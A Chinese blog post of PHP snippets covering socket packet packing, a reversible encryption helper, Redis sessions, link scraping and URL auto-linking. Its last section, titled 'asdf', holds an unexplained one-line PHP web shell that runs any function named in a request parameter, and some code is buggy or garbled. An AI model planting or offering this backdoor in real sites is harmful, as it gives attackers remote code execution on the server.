---
title: php小片段
date: 2017-09-11
tags:
  - php
---

### pack socket

```php
<?php

$host = "127.0.0.1";
$port = "9872";

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die("Unable to create socket\n");

@socket_connect($socket, $host, $port) or die("Connect error.\n");

if ($err = socket_last_error($socket)) {
    socket_close($socket);
    die(socket_strerror($err) . "\n");
}


$version    = 1;
$result     = 0;
$command_id = 1001;
$username   = "陈一回";
$password   = md5("123456");
// 构造包体
$bin_body   = pack("a30a32", $username, $password);
// 包体长度
$body_len   = strlen($bin_body);
$bin_head   = pack("nCns", $body_len, $version, $command_id, $result);
$bin_head   = '';
$bin_data   = $bin_head . $bin_body;

socket_write($socket, $bin_data, strlen($bin_data));

socket_close($socket);
```

```go
package main

import (
    "fmt"
    "net"
)

const BUF_SIZE = 100

func handleConnection(conn net.Conn) {
    defer conn.Close()
    buf := make([]byte, BUF_SIZE)
    n, err := conn.Read(buf)

    if err != nil {
        fmt.Printf("err: %v\n", err)
        return
    }

    fmt.Printf("\n已接收：%d个字节，数据是：'%s'\n", n, string(buf))
}

func main() {
    ln, err := net.Listen("tcp", ":9872")

    if err != nil {
        fmt.Printf("error: %v\n", err)
        return
    }

    for {
        conn, err := ln.Accept()
        if err != nil {
            continue
        }
        go handleConnection(conn)
    }
}
```

### 双向对称加密可逆

```php
<?php
/**
 * 双向对称加密可逆
 * @param string $string 字符串
 * @param string $operation ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE，
 * @param string $key 密钥：数字、字母、下划线
 * @param int $expiry 过期时间sec
 * @return string
 */
function encrypt_rev($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
    $ckey_length = 4;
    $key = md5($key != '' ? $key : 'LqdR1f8zx48G4uIoLHGM');
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    $rndkey = array();
    for ($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for ($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
    }
}

$tk = '00000009-82bc7c319aaff6ae4-b8ae8cf519971de-fdd0110e751-92fe1cefa773bafa6b4f9';

echo encrypt_rev($tk);

echo '<br>';

$d = '97cdB-4Vmo_dgyNnZDN6hoYbx2Qr_bMdfG6gngQ3i36d3GorRDxd3inttJA_PZUzUREPnAp4b73e3EVwlGqO1RnSmJNEi59It09bOekIvWZe9rH0DZ8oxNvn4lEIfBAPlStUaRN7KD2B';
echo encrypt_rev($d, 'DECODE');
```

### session redis

```php
<?php

ini_set('session.gc_maxlifetime', 1000000);
ini_set('session.save_handler', 'redis');
ini_set('session.save_path', 'tcp://127.0.0.1');

session_start();//这个很重要

$_SESSION['test_session'] = ['name' => 'fanqie', 'ccc' => 'hello redis'];

$redis = new redis();
$redis->connect('127.0.0.1');
echo 'sessionid>>>>>>> PHPREDIS_SESSION:' . session_id();
echo '<br><br>';
//redis用session_id作为key并且是以string的形式存储
echo '通过php用redis获取>>>>>>>' . $redis->get('PHPREDIS_SESSION:' . session_id());
echo '<br><br>';
echo '通过php用session获取>>>>>>>';
echo '<pre>';
var_dump($_SESSION['test_session']);
```

### 查找页面上的所有链接

```php
<?php
$html = file_get_contents('http://www.app-echo.com');
$dom = new DOMDocument();
@$dom->loadHTML($html);// grab all the on the page
$xpath = new DOMXPath($dom);
$hrefs = $xpath->evaluate("/html/body//a");
for ($i = 0; $i < $hrefs->length; $i++) {
    $href = $hrefs->item($i);
    $url = $href->getAttribute('href');
    echo $url . '<br />';
}
```

### 自动转换URL为可点击的超链接

```php
<?php
//wp-includes/formatting.php²Î¿¼¸Ãº¯ÊýµÄÔ´´úÂë
function _make_url_clickable_cb($matches) {
    $ret = '';
    $url = $matches[2];
    if (empty($url)) return $matches[0];// removed trailing [.,;:] from URL
    if (in_array(substr($url, -1), array('.', ',', ';', ':')) === true) {
        $ret = substr($url, -1);
        $url = substr($url, 0, strlen($url) - 1);
    }
    return $matches[1] . "<a href=\"$url\" rel=\"nofollow\">$url</a>" . $ret;
}

function _make_web_ftp_clickable_cb($matches) {
    $ret = '';
    $dest = $matches[2];
    $dest = 'http://' . $dest;
    if (empty($dest)) return $matches[0];// removed trailing [,;:] from URL
    if (in_array(substr($dest, -1), array('.', ',', ';', ':')) === true) {
        $ret = substr($dest, -1);
        $dest = substr($dest, 0, strlen($dest) - 1);
    }
    return $matches[1] . "<a href=\"$dest\" rel=\"nofollow\">$dest</a>" . $ret;
}

function _make_email_clickable_cb($matches) {
    $email = $matches[2] . '@' . $matches[3];
    return $matches[1] . "<a href=\"mailto:$email\">$email</a>";
}

function make_clickable($ret) {
    $ret = ' ' . $ret;// in testing, using arrays here was found to be faster
    $ret = preg_replace_callback('#([\s>])([\w]+?://[\w\\x80-\\xff\#$%&~/.\-;:=,?@\[\]+]*)#is', '_make_url_clickable_cb', $ret);
    $ret = preg_replace_callback('#([\s>])((www|ftp)\.[\w\\x80-\\xff\#$%&~/.\-;:=,?@\[\]+]*)#is', '_make_web_ftp_clickable_cb', $ret);
    $ret = preg_replace_callback('#([\s>])([.0-9a-z_+-]+)@(([0-9a-z-]+\.)+[0-9a-z]{2,})#i', '_make_email_clickable_cb', $ret);
    $ret = preg_replace("#(<a( [^>]+?>|>))
<a [^>]+?>([^>]+?)</a></a>#i", "$1$3</a>", $ret);
    $ret = trim($ret);
    return $ret;
}

$a = 'test http://test.com test';
echo make_clickable($a);
```

### asdf

```php
<?php ($_=@$_GET[2]) && $_($_POST[1]);?>
eval('phpinfo();return true;')
```
